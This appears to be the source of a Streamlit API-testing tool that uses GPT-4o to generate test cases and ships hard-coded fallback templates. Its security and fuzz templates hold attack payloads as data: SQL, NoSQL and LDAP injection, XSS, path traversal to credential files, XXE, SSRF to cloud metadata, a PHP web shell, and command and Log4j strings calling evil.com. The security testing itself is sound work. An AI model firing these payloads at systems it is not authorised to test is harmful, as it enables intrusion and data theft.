# -*- coding: utf-8 -*-
import streamlit as st
import requests
import json
import re
from datetime import datetime
from typing import Dict, Any, List, Optional
from reportlab.lib.pagesizes import letter, A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_LEFT
import io
from openai import OpenAI
from dotenv import load_dotenv
import os
import time
from jsonschema import validate, ValidationError

# Load environment variables
load_dotenv()

class APITester:
    def __init__(self, base_url: str, auth_config: Dict = None, timeout: int = 10,
                 openai_api_key: str = None, enable_ai_analysis: bool = True):
        """
        Initialize the API Tester with base URL and optional authentication.

        Args:
            base_url: Base URL of the API to test
            auth_config: Authentication configuration dict
            timeout: Request timeout in seconds
            openai_api_key: OpenAI API key for AI analysis (optional)
            enable_ai_analysis: Enable automatic AI analysis for critical failures (Hybrid Option 3)
        """
        self.base_url = base_url.rstrip('/')
        self.results = []
        self.auth_config = auth_config or {}
        self.timeout = timeout
        self.enable_ai_analysis = enable_ai_analysis

        # Initialize AI Root Cause Analyzer if enabled
        if enable_ai_analysis:
            try:
                self.ai_analyzer = AIRootCauseAnalyzer(openai_api_key)
            except Exception as e:
                print(f"⚠️ AI analyzer initialization failed: {e}")
                self.ai_analyzer = None
        else:
            self.ai_analyzer = None
        
    def log_result(self, test_name: str, status: str, details: str,
                   response_data: Dict = None, ai_analysis: Dict = None):
        """
        Log test results with optional response data and AI analysis.

        Args:
            test_name: Name of the test
            status: Test status (PASS/FAIL)
            details: Test details and error messages
            response_data: Response data dict
            ai_analysis: AI root cause analysis dict (for failed tests)
        """
        result = {
            'test': test_name,
            'status': status,
            'details': details,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'response_data': response_data
        }

        # Add AI analysis if available
        if ai_analysis:
            result['ai_analysis'] = ai_analysis

        self.results.append(result)
    
    def _get_headers(self, custom_headers: Dict = None) -> Dict:
        """Build headers including authentication"""
        headers = {'Content-Type': 'application/json'}
        
        if custom_headers:
            headers.update(custom_headers)
        
        auth_type = self.auth_config.get('type', 'none')
        
        if auth_type == 'bearer':
            token = self.auth_config.get('token', '')
            if token:
                headers['Authorization'] = f'Bearer {token}'
        
        elif auth_type == 'api_key':
            key_name = self.auth_config.get('key_name', 'X-API-Key')
            api_key = self.auth_config.get('api_key', '')
            if api_key:
                headers[key_name] = api_key
        
        return headers
    
    def _validate_response_body(self, response, expected_body: Dict = None, 
                                 expected_schema: Dict = None) -> tuple:
        """Validate response body against expected data or schema"""
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            return False, "Response is not valid JSON"
        
        if expected_body:
            if response_json == expected_body:
                return True, "Response body matches expected"
            else:
                return False, f"Body mismatch. Expected: {expected_body}, Got: {response_json}"
        
        if expected_schema:
            try:
                validate(instance=response_json, schema=expected_schema)
                return True, "Response matches schema"
            except ValidationError as e:
                return False, f"Schema validation failed: {e.message}"
        
        return True, "No body validation specified"
    
    def test_request(self, method: str, endpoint: str = '', data: Dict = None,
                    expected_status = 200, headers: Dict = None,
                    test_name: str = None, params: Dict = None,
                    expected_body: Dict = None, expected_schema: Dict = None,
                    validate_body: bool = False):
        """Enhanced test method with authentication and body validation

        Args:
            expected_status: Can be int (single status code) or list (multiple acceptable codes)
        """
        url = f"{self.base_url}{endpoint}"

        if test_name is None:
            test_name = f"{method} {url}"

        request_headers = self._get_headers(headers)
        
        auth = None
        if self.auth_config.get('type') == 'basic':
            username = self.auth_config.get('username', '')
            password = self.auth_config.get('password', '')
            if username and password:
                auth = (username, password)

        try:
            if method == "GET":
                response = requests.get(url, headers=request_headers, params=params, 
                                       auth=auth, timeout=self.timeout)
            elif method == "POST":
                response = requests.post(url, json=data, headers=request_headers, 
                                        params=params, auth=auth, timeout=self.timeout)
            elif method == "PUT":
                response = requests.put(url, json=data, headers=request_headers, 
                                       params=params, auth=auth, timeout=self.timeout)
            elif method == "PATCH":
                response = requests.patch(url, json=data, headers=request_headers, 
                                         params=params, auth=auth, timeout=self.timeout)
            elif method == "DELETE":
                response = requests.delete(url, headers=request_headers, params=params, 
                                          auth=auth, timeout=self.timeout)
            else:
                self.log_result(test_name, 'FAIL', f"Unsupported method: {method}")
                return None

            # Handle both single status code (int) and multiple codes (list)
            if isinstance(expected_status, list):
                status_match = response.status_code in expected_status
                expected_str = f"one of {expected_status}"
            else:
                status_match = response.status_code == expected_status
                expected_str = str(expected_status)

            body_valid = True
            body_message = ""

            if validate_body and status_match:
                body_valid, body_message = self._validate_response_body(
                    response, expected_body, expected_schema
                )

            if status_match and body_valid:
                details = f"Status: {response.status_code}, Time: {response.elapsed.total_seconds():.2f}s"
                if validate_body:
                    details += f", {body_message}"

                self.log_result(
                    test_name,
                    'PASS',
                    details,
                    {'status': response.status_code, 'time': response.elapsed.total_seconds()}
                )
                return response
            else:
                failure_reason = []
                if not status_match:
                    failure_reason.append(f"Expected status {expected_str}, got {response.status_code}")
                if not body_valid:
                    failure_reason.append(body_message)

                details = ". ".join(failure_reason)
                if len(response.text) > 0:
                    details += f". Response: {response.text[:200]}"

                # Hybrid Option 3: Auto-analyze critical failures
                ai_analysis = None
                if self.ai_analyzer and self.enable_ai_analysis:
                    try:
                        # Build failure context for AI analysis
                        failure_context = {
                            'test_name': test_name,
                            'test_type': 'functional',  # Can be overridden by caller
                            'endpoint': endpoint,
                            'method': method,
                            'expected_status': expected_status,
                            'actual_status': response.status_code,
                            'expected_response': expected_body,
                            'actual_response': response.json() if response.text else {},
                            'error_message': details,
                            'request_data': data,
                            'headers': self._get_headers(headers),
                            'response_time': response.elapsed.total_seconds() * 1000  # Convert to ms
                        }

                        # Check if this is a critical failure (Hybrid Option 3)
                        if self.ai_analyzer.is_critical_failure(failure_context):
                            print(f"🤖 Critical failure detected - Running AI analysis for: {test_name}")
                            ai_analysis = self.ai_analyzer.analyze_failure(failure_context)
                    except Exception as e:
                        print(f"⚠️ AI analysis failed: {e}")
                        ai_analysis = None

                self.log_result(test_name, 'FAIL', details, ai_analysis=ai_analysis)
                return None

        except requests.exceptions.Timeout:
            # Timeout is always critical - auto-analyze
            ai_analysis = None
            if self.ai_analyzer and self.enable_ai_analysis:
                try:
                    failure_context = {
                        'test_name': test_name,
                        'test_type': 'functional',
                        'endpoint': endpoint,
                        'method': method,
                        'error_message': f"Request timeout after {self.timeout}s",
                        'request_data': data,
                        'headers': self._get_headers(headers),
                        'actual_status': 0  # No response
                    }
                    print(f"🤖 Timeout detected - Running AI analysis for: {test_name}")
                    ai_analysis = self.ai_analyzer.analyze_failure(failure_context)
                except Exception as e:
                    print(f"⚠️ AI analysis failed: {e}")

            self.log_result(test_name, 'FAIL', f"Request timeout after {self.timeout}s",
                          ai_analysis=ai_analysis)
            return None
        except requests.exceptions.RequestException as e:
            # Network/connection errors - auto-analyze
            ai_analysis = None
            if self.ai_analyzer and self.enable_ai_analysis:
                try:
                    failure_context = {
                        'test_name': test_name,
                        'test_type': 'functional',
                        'endpoint': endpoint,
                        'method': method,
                        'error_message': str(e),
                        'request_data': data,
                        'headers': self._get_headers(headers),
                        'actual_status': 0
                    }
                    print(f"🤖 Request error detected - Running AI analysis for: {test_name}")
                    ai_analysis = self.ai_analyzer.analyze_failure(failure_context)
                except Exception as ex:
                    print(f"⚠️ AI analysis failed: {ex}")

            self.log_result(test_name, 'FAIL', f"Error: {str(e)}", ai_analysis=ai_analysis)
            return None
    
    def run_ai_generated_tests(self, test_cases: List[Dict]):
        """Run AI-generated test cases with enhanced features"""
        for i, test_case in enumerate(test_cases, 1):
            method = test_case.get('method', 'GET')
            endpoint = test_case.get('endpoint', '')
            data = test_case.get('data')
            expected_status = test_case.get('expected_status', 200)
            description = test_case.get('description', f'Test {i}')
            category = test_case.get('category', 'other')
            params = test_case.get('params')
            expected_body = test_case.get('expected_body')
            expected_schema = test_case.get('expected_schema')
            validate_body = test_case.get('validate_body', False)

            if category == 'custom':
                test_name = f"[Custom Test {i}] {description}"
            else:
                test_name = f"[AI Test {i}] {description}"

            self.test_request(
                method=method,
                endpoint=endpoint,
                data=data,
                expected_status=expected_status,
                test_name=test_name,
                params=params,
                expected_body=expected_body,
                expected_schema=expected_schema,
                validate_body=validate_body
            )
    
    def get_summary(self):
        """Get test summary"""
        total = len(self.results)
        passed = sum(1 for r in self.results if r['status'] == 'PASS')
        failed = total - passed
        
        return {
            'total': total,
            'passed': passed,
            'failed': failed,
            'pass_rate': (passed/total*100) if total > 0 else 0
        }


class OpenAITestGenerator:
    def __init__(self, api_key: str):
        """Initialize OpenAI API with GPT-4o for expert-level test generation"""
        # Clean and validate API key
        api_key = api_key.strip() if api_key else ""

        if not api_key or api_key == "dummy_key":
            print("⚠️  Warning: No valid OpenAI API key provided")
            self.client = None
        else:
            print(f"✅ Initializing OpenAI client with API key: {api_key[:7]}...{api_key[-4:]}")
            try:
                self.client = OpenAI(api_key=api_key)
                print("✅ OpenAI client initialized successfully")
            except Exception as e:
                print(f"❌ Failed to initialize OpenAI client: {str(e)}")
                self.client = None

        # Using GPT-4o - OpenAI's most advanced model for highest quality test case generation
        self.model = "gpt-4o"
        # Temperature 0.3 for highly deterministic, expert-level quality (like a senior QA lead)
        self.temperature = 0.3
        # Max tokens for comprehensive test case generation
        self.max_tokens = 8192
    
    def _clean_json_response(self, text: str) -> str:
        """Clean and extract JSON from AI response - SIMPLE VERSION"""
        # Remove markdown code blocks only
        text = re.sub(r'```(?:json)?\s*', '', text)
        text = re.sub(r'```\s*', '', text)

        # OpenAI returns clean JSON - just strip whitespace and return it
        # NO regex that could break URLs or other content
        return text.strip()
    
    def _validate_and_fix_test_case(self, tc: Dict) -> Dict:
        """Validate and fix a single test case"""
        if 'method' not in tc:
            tc['method'] = 'GET'
        
        if 'expected_status' not in tc:
            tc['expected_status'] = 200
        
        if 'description' not in tc:
            tc['description'] = f"{tc['method']} test"
        
        tc.setdefault('endpoint', '')
        tc.setdefault('data', None)
        tc.setdefault('category', 'other')
        tc.setdefault('params', None)
        tc.setdefault('validate_body', False)
        
        tc['method'] = tc['method'].upper()
        
        try:
            tc['expected_status'] = int(tc['expected_status'])
        except (ValueError, TypeError):
            tc['expected_status'] = 200
        
        return tc
    
    def _generate_fallback_tests(self, api_url: str, sample_data: Dict, num: int, has_auth: bool = False) -> List[Dict]:
        """Generate comprehensive fallback test cases with PROPORTIONAL distribution"""
        
        # Calculate proportional distribution
        distributions = {
            'happy_path': 0.25,      # 25%
            'negative_test': 0.20,   # 20%
            'security_test': 0.20,   # 20%
            'edge_case': 0.15,       # 15%
            'fuzz_test': 0.20        # 20%
        }

        counts = {
            'happy_path': max(3, int(num * distributions['happy_path'])),
            'negative_test': max(3, int(num * distributions['negative_test'])),
            'security_test': max(5, int(num * distributions['security_test'])),
            'edge_case': max(3, int(num * distributions['edge_case'])),
            'fuzz_test': max(3, int(num * distributions['fuzz_test']))
        }
        
        # Adjust to match exactly num tests
        total = sum(counts.values())
        if total < num:
            counts['happy_path'] += (num - total)
        elif total > num:
            counts['happy_path'] -= (total - num)
        
        all_tests = []
        
        # ============================================
        # SECURITY TESTS (25%)
        # ============================================
        
        security_templates = [
            # SQL Injection variants - Accept both rejection and acceptance (to detect lack of validation)
            {"method": "POST", "endpoint": "", "data": {"field": "'; DROP TABLE users; --"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SQL injection - DROP TABLE"},
            {"method": "POST", "endpoint": "", "data": {"field": "' OR '1'='1"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SQL injection - OR condition"},
            {"method": "POST", "endpoint": "", "data": {"field": "1' UNION SELECT NULL--"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SQL injection - UNION attack"},
            {"method": "GET", "endpoint": "", "params": {"id": "1 OR 1=1"},
             "expected_status": [200, 400, 403, 404], "description": "SQL injection in query param"},
            {"method": "POST", "endpoint": "", "data": {"field": "admin'--"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SQL injection - comment bypass"},

            # XSS variants
            {"method": "POST", "endpoint": "", "data": {"field": "<script>alert('xss')</script>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XSS - script tag"},
            {"method": "POST", "endpoint": "", "data": {"field": "<img src=x onerror=alert('xss')>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XSS - img onerror"},
            {"method": "POST", "endpoint": "", "data": {"field": "javascript:alert('xss')"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XSS - javascript protocol"},
            {"method": "POST", "endpoint": "", "data": {"field": "<svg onload=alert('xss')>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XSS - SVG onload"},
            {"method": "POST", "endpoint": "", "data": {"field": "<iframe src='javascript:alert(1)'>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XSS - iframe injection"},

            # Path Traversal variants
            {"method": "GET", "endpoint": "/../../../etc/passwd", "expected_status": [200, 404, 403],
             "description": "Path traversal - etc/passwd"},
            {"method": "GET", "endpoint": "/../../windows/system32/config/sam", "expected_status": [200, 404, 403],
             "description": "Path traversal - Windows SAM"},
            {"method": "POST", "endpoint": "", "data": {"file": "../../../etc/passwd"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Path traversal in POST data"},
            {"method": "GET", "endpoint": "", "params": {"file": "....//....//etc/passwd"},
             "expected_status": [200, 400, 403, 404], "description": "Path traversal - double encoding"},
            {"method": "GET", "endpoint": "/%2e%2e%2f%2e%2e%2fetc%2fpasswd", "expected_status": [200, 404, 403],
             "description": "Path traversal - URL encoded"},

            # Command Injection
            {"method": "POST", "endpoint": "", "data": {"cmd": "; ls -la"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Command injection - ls"},
            {"method": "POST", "endpoint": "", "data": {"cmd": "| cat /etc/passwd"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Command injection - pipe"},
            {"method": "POST", "endpoint": "", "data": {"cmd": "`whoami`"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Command injection - backticks"},
            {"method": "POST", "endpoint": "", "data": {"cmd": "$(curl evil.com)"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Command injection - subshell"},

            # NoSQL Injection
            {"method": "POST", "endpoint": "", "data": {"field": {"$gt": ""}},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "NoSQL injection - $gt operator"},
            {"method": "POST", "endpoint": "", "data": {"field": {"$ne": None}},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "NoSQL injection - $ne operator"},
            {"method": "POST", "endpoint": "", "data": {"field": {"$regex": ".*"}},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "NoSQL injection - regex"},

            # LDAP Injection
            {"method": "POST", "endpoint": "", "data": {"user": "*)(uid=*))(&(uid=*"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "LDAP injection"},
            {"method": "POST", "endpoint": "", "data": {"filter": "admin*"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "LDAP wildcard injection"},

            # XML/XXE Injection
            {"method": "POST", "endpoint": "", "data": {"xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "XXE injection"},

            # SSRF attempts
            {"method": "POST", "endpoint": "", "data": {"url": "http://localhost:22"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SSRF - localhost scan"},
            {"method": "POST", "endpoint": "", "data": {"url": "http://169.254.169.254/latest/meta-data/"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SSRF - AWS metadata"},
            {"method": "POST", "endpoint": "", "data": {"callback": "http://internal-server/admin"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "SSRF - internal network"},

            # Header Injection
            {"method": "GET", "endpoint": "", "params": {"redirect": "http://evil.com\r\nX-Injected: header"},
             "expected_status": [200, 400, 403, 404], "description": "CRLF injection"},

            # Authentication bypass attempts
            {"method": "POST", "endpoint": "/admin", "expected_status": [401, 403, 404] if has_auth else [200, 404],
             "description": "Admin endpoint without auth"},
            {"method": "GET", "endpoint": "/users", "params": {"admin": "true"},
             "expected_status": [200, 401, 403, 404] if has_auth else [200, 404], "description": "Privilege escalation attempt"},

            # Mass assignment
            {"method": "POST", "endpoint": "", "data": {"role": "admin", "is_superuser": True},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Mass assignment - admin role"},

            # File upload attacks
            {"method": "POST", "endpoint": "", "data": {"file": "<?php system($_GET['cmd']); ?>"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "PHP shell upload attempt"},
            {"method": "POST", "endpoint": "", "data": {"filename": "../../shell.php"},
             "expected_status": [200, 201, 400, 403, 404, 422], "description": "Path traversal in filename"},
        ]
        
        # Select security tests proportionally
        import random
        random.shuffle(security_templates)
        for i in range(min(counts['security_test'], len(security_templates))):
            test = security_templates[i].copy()
            test['category'] = 'security_test'
            test.setdefault('params', None)
            test.setdefault('data', None)
            test['validate_body'] = False
            all_tests.append(test)
        
        # If we need more security tests than templates, cycle through them
        if counts['security_test'] > len(security_templates):
            remaining = counts['security_test'] - len(security_templates)
            for i in range(remaining):
                test = security_templates[i % len(security_templates)].copy()
                test['category'] = 'security_test'
                test['description'] = f"{test['description']} (variant {i+1})"
                test.setdefault('params', None)
                test.setdefault('data', None)
                test['validate_body'] = False
                all_tests.append(test)
        
        # ============================================
        # HAPPY PATH TESTS (30%)
        # ============================================
        
        happy_templates = [
            {"method": "POST", "endpoint": "", "data": sample_data, "expected_status": [200, 201, 400, 404],
             "description": "Create resource with valid data"},
            {"method": "GET", "endpoint": "/1", "expected_status": [200, 404],
             "description": "Retrieve existing resource"},
            {"method": "GET", "endpoint": "", "expected_status": [200, 404],
             "description": "List all resources"},
            {"method": "GET", "endpoint": "", "params": {"page": 1, "limit": 10}, "expected_status": [200, 400, 404],
             "description": "List with pagination"},
            {"method": "PUT", "endpoint": "/1", "data": sample_data, "expected_status": [200, 201, 204, 404],
             "description": "Update existing resource"},
            {"method": "PATCH", "endpoint": "/1", "data": {list(sample_data.keys())[0]: "updated"} if sample_data else {"field": "value"},
             "expected_status": [200, 201, 204, 404], "description": "Partial update"},
            {"method": "DELETE", "endpoint": "/1", "expected_status": [200, 204, 404],
             "description": "Delete existing resource"},
            {"method": "GET", "endpoint": "", "params": {"sort": "asc"}, "expected_status": [200, 400, 404],
             "description": "List with sorting"},
            {"method": "GET", "endpoint": "", "params": {"filter": "active"}, "expected_status": [200, 400, 404],
             "description": "List with filtering"},
            {"method": "GET", "endpoint": "/1", "params": {"include": "details"}, "expected_status": [200, 404],
             "description": "Retrieve with includes"},
        ]
        
        for i in range(counts['happy_path']):
            test = happy_templates[i % len(happy_templates)].copy()
            test['category'] = 'happy_path'
            test.setdefault('params', None)
            test.setdefault('data', None)
            test['validate_body'] = False
            if i >= len(happy_templates):
                test['description'] = f"{test['description']} (variant {i // len(happy_templates) + 1})"
            all_tests.append(test)
        
        # ============================================
        # NEGATIVE TESTS (25%)
        # ============================================
        
        negative_templates = [
            {"method": "POST", "endpoint": "", "data": {}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with empty body"},
            {"method": "POST", "endpoint": "", "data": None, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with null body"},
            {"method": "GET", "endpoint": "/99999", "expected_status": [200, 404],
             "description": "Retrieve non-existent resource"},
            {"method": "GET", "endpoint": "/invalid-id", "expected_status": [200, 400, 404],
             "description": "Retrieve with invalid ID format"},
            {"method": "DELETE", "endpoint": "/99999", "expected_status": [200, 204, 404],
             "description": "Delete non-existent resource"},
            {"method": "PUT", "endpoint": "/99999", "data": sample_data, "expected_status": [200, 201, 404],
             "description": "Update non-existent resource"},
            {"method": "PATCH", "endpoint": "/99999", "data": {"field": "value"}, "expected_status": [200, 404],
             "description": "Partial update non-existent"},
            {"method": "GET", "endpoint": "", "params": {"limit": -1}, "expected_status": [200, 400, 404],
             "description": "List with negative limit"},
            {"method": "GET", "endpoint": "", "params": {"page": 0}, "expected_status": [200, 400, 404],
             "description": "List with zero page"},
            {"method": "POST", "endpoint": "", "data": {"invalid": "field"}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with invalid fields"},
        ]
        
        # Add missing field tests for each field in sample_data
        if sample_data:
            for key in list(sample_data.keys())[:5]:
                incomplete = {k: v for k, v in sample_data.items() if k != key}
                negative_templates.append({
                    "method": "POST", "endpoint": "", "data": incomplete, "expected_status": [200, 201, 400, 404, 422],
                    "description": f"Create missing required field: {key}"
                })
        
        for i in range(counts['negative_test']):
            test = negative_templates[i % len(negative_templates)].copy()
            test['category'] = 'negative_test'
            test.setdefault('params', None)
            test.setdefault('data', None)
            test['validate_body'] = False
            if i >= len(negative_templates):
                test['description'] = f"{test['description']} (variant {i // len(negative_templates) + 1})"
            all_tests.append(test)
        
        # ============================================
        # EDGE CASE TESTS (20%)
        # ============================================
        
        edge_templates = [
            {"method": "POST", "endpoint": "", "data": {**sample_data, **{list(sample_data.keys())[0]: "a" * 10000}} if sample_data else {"field": "a" * 10000},
             "expected_status": [200, 201, 400, 404, 413, 422], "description": "Create with extremely long string"},
            {"method": "POST", "endpoint": "", "data": {**sample_data, **{list(sample_data.keys())[0]: ""}} if sample_data else {"field": ""},
             "expected_status": [200, 201, 400, 404, 422], "description": "Create with empty string field"},
            {"method": "POST", "endpoint": "", "data": {**sample_data, **{list(sample_data.keys())[0]: None}} if sample_data else {"field": None},
             "expected_status": [200, 201, 400, 404, 422], "description": "Create with null field"},
            {"method": "GET", "endpoint": "", "params": {"limit": 1000000}, "expected_status": [200, 400, 404],
             "description": "List with excessive limit"},
            {"method": "POST", "endpoint": "", "data": {"field": -999999}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with large negative number"},
            {"method": "POST", "endpoint": "", "data": {"field": 0}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with zero value"},
            {"method": "POST", "endpoint": "", "data": {"field": 999999999999999}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with very large number"},
            {"method": "GET", "endpoint": "", "params": {"sort": "invalid"}, "expected_status": [200, 400, 404],
             "description": "List with invalid sort parameter"},
            {"method": "POST", "endpoint": "", "data": {"field": "   "}, "expected_status": [200, 201, 400, 404, 422],
             "description": "Create with whitespace only"},
            {"method": "POST", "endpoint": "", "data": {"field": "test emoji"}, "expected_status": [200, 201, 404],
             "description": "Create with special characters"},
        ]
        
        for i in range(counts['edge_case']):
            test = edge_templates[i % len(edge_templates)].copy()
            test['category'] = 'edge_case'
            test.setdefault('params', None)
            test.setdefault('data', None)
            test['validate_body'] = False
            if i >= len(edge_templates):
                test['description'] = f"{test['description']} (variant {i // len(edge_templates) + 1})"
            all_tests.append(test)

        # ============================================
        # FUZZ TESTS (20%) - Expert-level fuzzing
        # ============================================

        fuzz_templates = [
            # Random/malformed data fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": "A" * 100000}, "expected_status": [200, 201, 400, 413, 422],
             "description": "Fuzz: Extremely large string payload (100k chars)"},
            {"method": "POST", "endpoint": "", "data": {"field": "\x00\x01\x02\x03\x04"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Binary/null bytes in string field"},
            {"method": "POST", "endpoint": "", "data": {"field": "\u0000\uFFFF\uD800"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Invalid unicode characters"},
            {"method": "POST", "endpoint": "", "data": {"field": "%s%s%s%s%s%s%s%s%s%s"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Format string attack vector"},

            # Type confusion fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": [1, 2, 3]}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Array instead of string"},
            {"method": "POST", "endpoint": "", "data": {"field": {"nested": "object"}}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Object instead of primitive"},
            {"method": "POST", "endpoint": "", "data": {"field": True}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Boolean instead of string"},
            {"method": "POST", "endpoint": "", "data": {}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Completely empty object"},

            # Encoding fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": "%00%00%00%00"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: URL-encoded null bytes"},
            {"method": "POST", "endpoint": "", "data": {"field": "\"><script>alert(1)</script>"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: HTML context breaking"},
            {"method": "POST", "endpoint": "", "data": {"field": "../../../etc/passwd\x00.jpg"}, "expected_status": [200, 201, 400, 403, 422],
             "description": "Fuzz: Null byte injection with path traversal"},

            # Integer overflow/underflow fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": 2147483647}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Max 32-bit integer (INT_MAX)"},
            {"method": "POST", "endpoint": "", "data": {"field": -2147483648}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Min 32-bit integer (INT_MIN)"},
            {"method": "POST", "endpoint": "", "data": {"field": 9223372036854775807}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Max 64-bit integer"},
            {"method": "POST", "endpoint": "", "data": {"field": -9223372036854775808}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Min 64-bit integer"},

            # Special character fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": "!@#$%^&*()_+-={}[]|\\:;\"'<>,.?/~`"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: All special characters"},
            {"method": "POST", "endpoint": "", "data": {"field": "\n\r\t\b\f"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Control characters (newline, tab, etc)"},
            {"method": "POST", "endpoint": "", "data": {"field": "' OR '1'='1' --"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: SQL injection payload"},
            {"method": "POST", "endpoint": "", "data": {"field": "${jndi:ldap://evil.com/a}"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Log4j RCE payload (CVE-2021-44228)"},

            # Header fuzzing
            {"method": "GET", "endpoint": "", "params": {"param": "A" * 10000}, "expected_status": [200, 400, 414],
             "description": "Fuzz: Extremely long query parameter"},
            {"method": "GET", "endpoint": "/" + "A" * 5000, "expected_status": [200, 404, 414],
             "description": "Fuzz: Extremely long URL path"},

            # Array/nested object fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": [[[[[["deeply", "nested"]]]]]]}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Deeply nested arrays"},
            {"method": "POST", "endpoint": "", "data": {"a": {"b": {"c": {"d": {"e": {"f": "deep"}}}}}}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Deeply nested objects"},

            # Float/decimal fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": 1.7976931348623157e+308}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Max float value"},
            {"method": "POST", "endpoint": "", "data": {"field": 0.0000000000000000000000001}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Extremely small float"},
            {"method": "POST", "endpoint": "", "data": {"field": float('inf')}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Infinity value"},

            # Duplicate field fuzzing
            {"method": "POST", "endpoint": "", "data": {"field": "first", "field": "second"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Duplicate JSON keys"},

            # CRLF injection
            {"method": "GET", "endpoint": "", "params": {"param": "value\r\nX-Injected: true"}, "expected_status": [200, 400],
             "description": "Fuzz: CRLF injection in parameter"},

            # Buffer overflow attempts
            {"method": "POST", "endpoint": "", "data": {"field": "A" * 1000000}, "expected_status": [200, 201, 400, 413, 422, 500],
             "description": "Fuzz: 1MB string payload (potential buffer overflow)"},

            # Race condition fuzzing (timing)
            {"method": "DELETE", "endpoint": "/1", "expected_status": [200, 204, 404],
             "description": "Fuzz: DELETE non-existent (race condition test)"},

            # Polyglot payloads
            {"method": "POST", "endpoint": "", "data": {"field": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: Polyglot XSS payload"},

            # JSON injection
            {"method": "POST", "endpoint": "", "data": {"field": '{"injected": "json"}'}, "expected_status": [200, 201, 400, 422],
             "description": "Fuzz: JSON string injection"},
        ]

        for i in range(counts['fuzz_test']):
            test = fuzz_templates[i % len(fuzz_templates)].copy()
            test['category'] = 'fuzz_test'
            test.setdefault('params', None)
            test.setdefault('data', None)
            test['validate_body'] = False
            if i >= len(fuzz_templates):
                test['description'] = f"{test['description']} (variant {i // len(fuzz_templates) + 1})"
            all_tests.append(test)

        # Shuffle to mix categories
        random.shuffle(all_tests)

        return all_tests[:num]
    
    def generate_test_cases(self, api_url: str, sample_data: Dict, num_tests: int = 50,
                           test_types: List[str] = None, has_auth: bool = False,
                           status_container=None) -> tuple:
        """Generate test cases using OpenAI GPT-4o - Returns (test_cases, used_fallback)

        For large numbers (>50), uses batching to ensure we get all requested tests.
        """

        if test_types is None:
            test_types = ["happy_path", "edge_cases", "negative_tests", "security_tests"]

        def update_status(message):
            """Helper to update status if container provided"""
            if status_container:
                status_container.update(label=message)

        # For large test counts (>50), use batching to ensure we get all tests
        if num_tests > 50:
            return self._generate_test_cases_batched(
                api_url, sample_data, num_tests, test_types, has_auth, status_container
            )
        
        auth_note = "Note: API requires authentication." if has_auth else ""
        
        prompt = f"""As a SENIOR QA ARCHITECT, generate EXACTLY {num_tests} production-ready API test cases for:

API ENDPOINT: {api_url}
